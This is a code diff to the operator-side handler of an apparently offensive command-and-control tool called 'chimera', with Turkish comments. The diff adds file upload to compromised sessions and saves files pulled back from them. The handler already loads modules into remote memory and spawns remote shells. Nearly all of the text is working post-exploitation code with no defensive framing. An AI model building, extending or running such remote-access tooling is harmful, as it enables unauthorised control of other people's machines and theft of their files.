@@ -244,19 +244,21 @@ class Handler(BaseHandler):
                 cmd = input(f"chimera ({self.session_id}) > ")
                 if not cmd.strip(): continue
                 
-                if cmd.lower() in ["exit", "quit"]:
+                cmd_lower = cmd.strip().lower()
+                
+                if cmd_lower in ["exit", "quit"]:
                     # Session'ı kapat
                     print("[*] Bağlantı kapatılıyor...")
                     self.send_data("terminate")
                     break
                     
-                if cmd.lower() in ["background", "bg"]:
+                if cmd_lower in ["background", "bg"]:
                     # Arka plana at (Session açık kalır)
                     print(f"[*] Session {self.session_id} arka plana atıldı.")
                     break
 
                 # Özellik 2.1: Modül Yükleme (Local File -> Remote Memory)
-                if cmd.startswith("loadmodule "):
+                if cmd_lower.startswith("loadmodule "):
                     try:
                         parts = cmd.split(" ", 1)
                         if len(parts) < 2:
@@ -285,11 +287,37 @@ class Handler(BaseHandler):
                         print(f"[!] Modül hazırlama hatası: {str(e)}")
                         continue
 
+                # Özellik 3.1: Dosya Upload (Local -> Remote)
+                if cmd_lower.startswith("upload "):
+                    try:
+                        parts = cmd.split(" ", 2)
+                        if len(parts) < 2:
+                            print("[!] Kullanım: upload <local_path> [remote_path]")
+                            continue
+                        
+                        local_path = parts[1]
+                        remote_path = parts[2] if len(parts) > 2 else os.path.basename(local_path)
+                        
+                        if not os.path.exists(local_path):
+                            print(f"[!] Dosya bulunamadı: {local_path}")
+                            continue
+                            
+                        with open(local_path, "rb") as f:
+                            file_content = f.read()
+                            b64_content = base64.b64encode(file_content).decode('utf-8')
+                            
+                        print(f"[*] Dosya yükleniyor: {local_path} -> {remote_path} ({len(file_content)} bytes)")
+                        cmd = f"upload {remote_path} {b64_content}"
+                        
+                    except Exception as e:
+                        print(f"[!] Upload hazırlık hatası: {str(e)}")
+                        continue
+
                 # Komutu gönder
                 self.send_data(cmd)
 
                 # Özellik 2.3: Shell Spawning
-                if cmd.strip().lower() == "shell":
+                if cmd_lower == "shell":
                     # Önce "Shell başlatıldı" mesajını bekle
                     response = self.recv_data()
                     print(response)
@@ -304,7 +332,35 @@ class Handler(BaseHandler):
                 # Normal komut cevabı bekle
                 response = self.recv_data()
                 if response:
-                    print(response)
+                    # Özellik 3.1: Download Cevabı Kontrolü
+                    if response.startswith("DOWNLOAD_OK:"):
+                        try:
+                            # Format: DOWNLOAD_OK:<base64>
+                            b64_data = response.split(":", 1)[1]
+                            file_content = base64.b64decode(b64_data)
+                            
+                            # Dosya adını komuttan çıkarmaya çalış
+                            # Orijinal komut: download <remote_path>
+                            # Biz burada orijinal 'cmd' değişkenini kullanıyoruz ama 'cmd' overwrite edilmiş olabilir mi?
+                            # Hayır, 'download' komutu upload bloğuna girmediği için 'cmd' orijinal halinde.
+                            
+                            parts = cmd.split(" ")
+                            if len(parts) >= 2:
+                                filename = os.path.basename(parts[1])
+                            else:
+                                filename = f"downloaded_{int(time.time())}.bin"
+                                
+                            # Varsa download klasörüne kaydet, yoksa current dir
+                            save_path = os.path.join(os.getcwd(), filename)
+                            
+                            with open(save_path, "wb") as f:
+                                f.write(file_content)
+                                
+                            print(f"[+] Dosya başarıyla indirildi: {save_path} ({len(file_content)} bytes)")
+                        except Exception as e:
+                            print(f"[!] Download kaydetme hatası: {str(e)}")
+                    else:
+                        print(response)
                 else:
                     print("[!] Bağlantı koptu.")
                     break
